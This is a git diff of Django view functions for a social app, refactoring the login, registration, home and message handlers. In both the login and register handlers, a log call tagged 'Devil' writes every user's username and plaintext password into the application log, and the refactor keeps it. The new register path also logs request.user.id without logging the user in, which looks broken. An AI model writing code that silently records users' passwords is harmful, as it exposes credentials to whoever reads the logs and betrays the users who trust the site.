@@ -16,7 +16,7 @@ from Human.methods import create_user, get_user_groups, get_group_joined_num, \
     get_user_global_info, get_user_global_graph, get_user_global_map, update_profile
 from Human.models import Group, GroupMember
 from Human.utils import create_avatar, logger_join, check_groupid, check_profile, smart_search, handle_avatar, \
-    get_session_id, create_session_id
+    get_session_id, create_session_id, login_user
 from LineMe.constants import PROJECT_NAME, IDENTIFIER, CITIES_TABLE
 from LineMe.settings import logger
 
@@ -42,22 +42,15 @@ def lm_login(request):
             username = lf.cleaned_data['username']
             password = lf.cleaned_data['password']
 
-            user = authenticate(username=username, password=password)
+            if login_user(request, username, password) == 0:
 
-            if user is not None:
-                if user.is_active:
-                    login(request, user)
-                    create_session_id(request)
+                logger.warning(logger_join('Devil', '[' + ','.join([str(request.user.id), username, password]) + ']'))
+                logger.info(logger_join('Login', get_session_id(request)))
 
-                    logger.warning(logger_join('Devil', '[' + ','.join([str(user.id), username, password]) + ']'))
-                    logger.info(logger_join('Login', get_session_id(request)))
+                return redirect('home')
 
-                    return redirect('home')
-                else:
-                    return redirect('login')
-        else:
-            context["status"] = -1
-            return render(request, 'Human/login.html', context)
+        context["status"] = -1
+        return render(request, 'Human/login.html', context)
 
     else:
         return render(request, 'Human/login.html', context)
@@ -86,16 +79,9 @@ def lm_register(request):
             # print name, password, email
 
             if status == 0:
-                user = authenticate(username=name, password=password)
-                if user is not None:
-                    if user.is_active:
-                        request.session['NewLogin'] = True
-                        login(request, user)
-                        create_session_id(request)
-
-                        logger.info(logger_join('New', get_session_id(request)))
-                        logger.warning(logger_join('Devil', '[' + ','.join([str(user.id), name, password]) + ']'))
-                        return redirect('profile')
+                request.session['NewLogin'] = True
+                logger.warning(logger_join('Devil', '[' + ','.join([str(request.user.id), name, password]) + ']'))
+                return redirect('profile')
             else:
                 return render(request, 'Human/register.html', context)
         else:
@@ -144,13 +130,10 @@ def home(request):
             context["status"] = status
             if status == 0:
                 groupid = Group.objects.get(group_name=name).id
-                logger.info(logger_join('New', get_session_id(request), id=groupid))
                 return redirect('group', groupid=groupid)
-            else:
-                return render(request, 'Human/home.html', context)
-        else:
-            context["status"] = -1
-            return render(request, 'Human/home.html', context)
+
+        context["status"] = -1
+        return render(request, 'Human/home.html', context)
     else:
         return render(request, 'Human/home.html', context)
 
@@ -183,16 +166,13 @@ def msg_panel(request, page):
 
 
 @login_required
-def msg_handle(request, type, linkid):
+def msg_handle(request, mtype, linkid):
     user = request.user
-    if type == '1':
+
+    if mtype == '1':
         status = link_confirm(request, user, int(linkid))
-
-        # print 'Confirm Link: ', linkid, user.username
-    elif type == '0':
+    elif mtype == '0':
         status = link_reject(request, user, int(linkid))
-
-        # print 'Reject Link: ', linkid, user.username
     else:
         raise Http404
 
@@ -204,6 +184,7 @@ def inv_panel(request, page):
     user = request.user
     if request.is_ajax():
 
+        # Todo: fix chinese 500
         group_name = request.GET.get('groupname')
         if group_name:
             invs = get_user_invs(user, group_name)
